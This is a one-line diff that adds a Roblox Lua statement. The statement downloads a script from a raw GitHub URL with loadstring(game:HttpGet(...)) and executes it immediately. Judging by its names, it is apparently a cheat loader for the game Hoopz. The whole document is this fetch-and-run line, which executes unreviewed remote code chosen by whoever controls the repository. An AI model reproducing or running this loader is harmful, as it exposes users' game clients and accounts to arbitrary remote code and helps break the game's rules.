@@ -1,0 +1,1 @@
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Hoopz444/main/HoopzOP1"))()
